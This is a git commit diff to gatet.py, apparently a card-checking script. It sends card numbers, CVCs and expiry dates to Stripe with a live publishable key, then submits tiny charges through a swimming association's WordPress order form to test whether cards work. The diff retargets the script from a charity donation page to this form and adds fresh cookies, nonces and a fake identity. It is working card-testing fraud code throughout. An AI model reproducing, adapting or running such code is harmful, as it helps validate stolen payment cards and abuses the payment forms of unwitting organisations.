9a2c96b7851c05b0c849322a5ccf1ff211188f2b
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-02-24 17:27:20 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,27 +26,29 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&referrer=https%3A%2F%2Fsf-andrei.ungheni.org&time_on_page=22151&key=pk_live_51QfliUFKZ8eMqedqNirmPDModwOs3OSHWEYU6FJVq62B3GHYpXTPhZ0uvNQ43bZ5RmVI2cBXUZZ3YQInvwCjBUNQ00wL6ZnugZ'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&key=pk_live_51Jez78BKwt72jNCmXW07XYSzt9cnaUVtC9aTdAF3ImhhQ8KcGKRlpJh9VjBEqq51laaZcYO4GWHpHRU8nCSP5WAB00I9qJSMtV'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '_ga': 'GA1.1.2058644450.1740293773',
-	    '__stripe_mid': '9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9',
-	    '__stripe_sid': 'd5d40c77-fb62-4373-8368-01019b1a92d1716f79',
-	    '_ga_BQL8LZB454': 'GS1.1.1740293772.1.0.1740293795.0.0.0',
+	    'PHPSESSID': '6874g8to8j67r6c87qhfej6l2b',
+	    '_ga': 'GA1.2.1574929798.1740392008',
+	    '_gid': 'GA1.2.1952496765.1740392008',
+	    '_ga_Y6Z6HMHW5Q': 'GS1.2.1740392007.1.0.1740392007.0.0.0',
+	    '__stripe_mid': 'dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70',
+	    '__stripe_sid': '43d099d0-7ec2-4f18-aa84-62a778ae7d479f9fb4',
 	}
 	
 	headers = {
-	    'authority': 'sf-andrei.ungheni.org',
+	    'authority': 'www.sussexswimming.org',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_ga=GA1.1.2058644450.1740293773; __stripe_mid=9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9; __stripe_sid=d5d40c77-fb62-4373-8368-01019b1a92d1716f79; _ga_BQL8LZB454=GS1.1.1740293772.1.0.1740293795.0.0.0',
-	    'origin': 'https://sf-andrei.ungheni.org',
-	    'referer': 'https://sf-andrei.ungheni.org/give/',
+	    # 'cookie': 'PHPSESSID=6874g8to8j67r6c87qhfej6l2b; _ga=GA1.2.1574929798.1740392008; _gid=GA1.2.1952496765.1740392008; _ga_Y6Z6HMHW5Q=GS1.2.1740392007.1.0.1740392007.0.0.0; __stripe_mid=dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70; __stripe_sid=43d099d0-7ec2-4f18-aa84-62a778ae7d479f9fb4',
+	    'origin': 'https://www.sussexswimming.org',
+	    'referer': 'https://www.sussexswimming.org/swimming/county-championships-2025/coach-team-manager-lunch-orders-championships-2025/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -58,17 +60,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1740293796319',
+	    't': '1740392091739',
 	}
 	
 	data = {
-	    'data': 'ak_hp_textarea=&ak_js=1740293772415&__fluent_form_embded_post_id=2086&_fluentform_3_fluentformnonce=faca494b55&_wp_http_referer=%2Fgive%2F&payment_input%5B%5D=Doneaz%C4%83%201%20Euro&custom-payment-amount=&payment_method=stripe&payment_input_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=14688&_fluentform_30_fluentformnonce=d8e6b0afa6&_wp_http_referer=%2Fswimming%2Fcounty-championships-2025%2Fcoach-team-manager-lunch-orders-championships-2025%2F&input_text_1=Rodam&input_text_2=User&email=rodamuser20%40gmail.com&multi_select%5B%5D=Beacon%20SC&input_radio_sat10=Saturday%208thFebruary%20option%201%20&input_radio_sat25=Sunday%2023rd%20February%20option%203&custom-payment-amount=0.30&payment_method=stripe&input_radio_sat11=&input_radio_sat24=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '3',
+	    'form_id': '30',
 	}
 	
 	r2 = requests.post(
-	    'https://sf-andrei.ungheni.org/wp-admin/admin-ajax.php',
+	    'https://www.sussexswimming.org/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
